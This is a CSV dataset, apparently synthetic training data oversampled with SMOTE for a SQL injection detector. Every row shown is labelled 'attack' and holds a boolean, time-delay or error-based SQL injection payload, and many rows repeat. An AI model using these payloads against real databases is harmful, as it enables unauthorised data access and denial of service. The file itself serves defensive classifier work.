id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000384,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000017,1.4674960767890382
SMOTE_000385,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000016,0.21810060999846018
SMOTE_000386,attack,boolean,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000026,1.6474239400240214
SMOTE_000387,attack,boolean,"1 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000025,2.0690195880812476
SMOTE_000388,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000016,2.063825756025184
SMOTE_000389,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000017,2.136875415305449
SMOTE_000390,attack,boolean,"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000030,2.8093324206458545
SMOTE_000391,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000009,1.8757434206909698
SMOTE_000392,attack,boolean,"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000006,0.7534463464788306
SMOTE_000393,attack,boolean,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'wzrj'  =  'wzrj",nearest_attack_euclidean,R000024,1.7106974836408635
SMOTE_000394,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000009,1.1985187831792956
SMOTE_000395,attack,boolean,"1%' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",nearest_attack_euclidean,R000002,0.7745456524016485
SMOTE_000396,attack,boolean,"1 where 5485  =  5485 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000005,2.287906958671625
SMOTE_000397,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000009,1.5490079570707107
SMOTE_000398,attack,boolean,"1%' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",nearest_attack_euclidean,R000002,1.366779508249278
SMOTE_000399,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,1.450153454822733
SMOTE_000400,attack,boolean,-1760   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  1541  =  1541,nearest_attack_euclidean,R000011,0.25897231054122194
SMOTE_000401,attack,boolean,"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000030,3.126936494016403
SMOTE_000402,attack,boolean,-8004%'  )   or   (  2301  =  7504  )  *7504 and   (  '%'  =  ',nearest_attack_euclidean,R000015,1.3351132212008643
SMOTE_000403,attack,boolean,"1""  )   as jidc where 6093  =  6093 and 9198  =  9198--",nearest_attack_euclidean,R000023,0.7428252554928407
SMOTE_000404,attack,boolean,1'   )    )    and 2832  =  4165--,nearest_attack_euclidean,R000010,0.7448435018003282
SMOTE_000405,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000009,1.4873321130781159
SMOTE_000406,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000004,2.2390806427438457
SMOTE_000407,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000021,2.3119146011669165
SMOTE_000408,attack,boolean,"-1772   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8904  =  8904",nearest_attack_euclidean,R000029,0.9069175179281579
SMOTE_000409,attack,boolean,"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000006,0.12389297068567025
SMOTE_000410,attack,boolean,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'wzrj'  =  'wzrj",nearest_attack_euclidean,R000024,0.5150869066248193
SMOTE_000411,attack,boolean,""" or isNULL  (  1/0  )   /*",nearest_attack_euclidean,R000001,1.0477313066524623
SMOTE_000412,attack,boolean,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000031,0.06168010166447862
SMOTE_000413,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000004,1.3252290699776188
SMOTE_000414,attack,boolean,"-1772   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8904  =  8904",nearest_attack_euclidean,R000029,0.17278703927464498
SMOTE_000415,attack,boolean,"-2583""  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000019,0.8884355652974897
SMOTE_000416,attack,boolean,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'wzrj'  =  'wzrj",nearest_attack_euclidean,R000024,0.10938690157259824
SMOTE_000417,attack,boolean,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'wzrj'  =  'wzrj",nearest_attack_euclidean,R000024,1.7364875707439296
SMOTE_000418,attack,boolean,"1%' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",nearest_attack_euclidean,R000002,0.8050206402816171
SMOTE_000419,attack,boolean,1'   )    )    and 2832  =  4165--,nearest_attack_euclidean,R000010,0.7224806227742024
SMOTE_000420,attack,boolean,"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000030,3.1598769969421814
SMOTE_000421,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000009,1.312813345374323
SMOTE_000422,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000004,0.15348700811189234
SMOTE_000423,attack,boolean,"1 where 5485  =  5485 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000005,1.4045744353494385
SMOTE_000424,attack,boolean,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000031,1.506115034952194
SMOTE_000425,attack,boolean,"1""  )   as jidc where 6093  =  6093 and 9198  =  9198--",nearest_attack_euclidean,R000023,1.5011589424275922
SMOTE_000426,attack,boolean,"1""  )   as jidc where 6093  =  6093 and 9198  =  9198--",nearest_attack_euclidean,R000023,0.4250020557788828
SMOTE_000427,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000016,2.590180890493556
SMOTE_000428,attack,boolean,"1 where 5485  =  5485 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000005,1.5444952047882456
SMOTE_000429,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,0.5104123355452928
SMOTE_000430,attack,boolean,-9148  )   where 2027  =  2027 or 8571  =  8571--,nearest_attack_euclidean,R000007,0.488657021322044
SMOTE_000431,attack,boolean,"-1772   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8904  =  8904",nearest_attack_euclidean,R000029,1.5533301460264397
SMOTE_000432,attack,boolean,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'wzrj'  =  'wzrj",nearest_attack_euclidean,R000024,1.803329746629317
SMOTE_000433,attack,boolean,"1 where 5485  =  5485 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000005,0.1211727963783127
SMOTE_000434,attack,boolean,"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000030,3.0217266398209546
SMOTE_000435,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000017,1.2234446302753446
SMOTE_000436,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000021,1.267656172108654
SMOTE_000437,attack,boolean,"-2583""  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000019,0.45445408927631153
SMOTE_000438,attack,boolean,"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000006,0.061117834530219524
SMOTE_000439,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,0.373578187129873
SMOTE_000440,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000004,0.010966089547962538
SMOTE_000441,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,2.6659352558460654
SMOTE_000442,attack,boolean,"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000030,0.5587206066267548
SMOTE_000443,attack,boolean,"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000030,0.8946168176413142
SMOTE_000444,attack,boolean,"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000006,0.3795611766309248
SMOTE_000445,attack,boolean,"-2583""  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000019,1.2390364682486517
SMOTE_000446,attack,boolean,"1""  )   as jidc where 6093  =  6093 and 9198  =  9198--",nearest_attack_euclidean,R000023,0.7685471077961584
SMOTE_000447,attack,boolean,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000026,1.1030935813892493
SMOTE_000448,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000004,0.7217371652788707
SMOTE_000449,attack,boolean,"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000030,3.1441493033278327
SMOTE_000450,attack,boolean,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'wzrj'  =  'wzrj",nearest_attack_euclidean,R000024,0.6835132338118433
SMOTE_000451,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,2.184334776629737
SMOTE_000452,attack,boolean,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'wzrj'  =  'wzrj",nearest_attack_euclidean,R000024,4.032875064499571
SMOTE_000453,attack,boolean,1%'   )    )     )   and 1661  =  7683,nearest_attack_euclidean,R000003,0.8587688580301783
SMOTE_000454,attack,boolean,"1 where 5485  =  5485 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000005,0.49106222615407313
SMOTE_000455,attack,boolean,"1 where 7522  =  7522 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",nearest_attack_euclidean,R000027,1.0771845725959694
SMOTE_000456,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,1.2184561924412771
SMOTE_000457,attack,boolean,-9148  )   where 2027  =  2027 or 8571  =  8571--,nearest_attack_euclidean,R000007,0.7147240647272308
SMOTE_000458,attack,boolean,"1 where 7522  =  7522 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",nearest_attack_euclidean,R000027,5.446481498919115
SMOTE_000459,attack,boolean,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000031,1.4069182823819784
SMOTE_000460,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000017,1.1943280877433593
SMOTE_000461,attack,boolean,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'wzrj'  =  'wzrj",nearest_attack_euclidean,R000024,1.6953399576787034
SMOTE_000462,attack,boolean,"1'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000022,1.1461995841876296
SMOTE_000463,attack,boolean,"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'nwdk' like 'nwdk",nearest_attack_euclidean,R000018,0.1546198476197841
SMOTE_000464,attack,boolean,"1""  )   as jidc where 6093  =  6093 and 9198  =  9198--",nearest_attack_euclidean,R000023,2.2630327690474297
SMOTE_000465,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000004,2.250662895832296
SMOTE_000466,attack,boolean,"1'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000022,2.2238829028985565
SMOTE_000467,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000017,1.1277889812997053
SMOTE_000468,attack,boolean,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000026,1.6134687747741363
SMOTE_000469,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000004,0.1671600357571018
SMOTE_000470,attack,boolean,"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000006,0.827100888492178
SMOTE_000471,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000009,1.918217072330354
SMOTE_000472,attack,boolean,"-1772   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8904  =  8904",nearest_attack_euclidean,R000029,4.116148029815059
SMOTE_000473,attack,boolean,1'   )    )    and 2832  =  4165--,nearest_attack_euclidean,R000010,0.6333593057609074
SMOTE_000474,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000009,0.918306759713887
SMOTE_000475,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000004,2.043888335917946
SMOTE_000476,attack,boolean,"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000030,1.494329776536967
SMOTE_000477,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,1.6380003118717672
SMOTE_000478,attack,boolean,"-8327 where 7555  =  7555 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R000013,2.0094277994652634
SMOTE_000479,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,1.3025979487045571
SMOTE_000480,attack,boolean,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000031,2.0887170732989313
SMOTE_000481,attack,boolean,""" or isNULL  (  1/0  )   /*",nearest_attack_euclidean,R000001,2.989624360822253
SMOTE_000482,attack,boolean,"-2583""  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000019,5.261692647853218e-05
SMOTE_000483,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000016,1.4455709712357467
SMOTE_000484,attack,boolean,"-1772   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8904  =  8904",nearest_attack_euclidean,R000029,1.2163292162168908
SMOTE_000485,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000009,1.5636512680251835
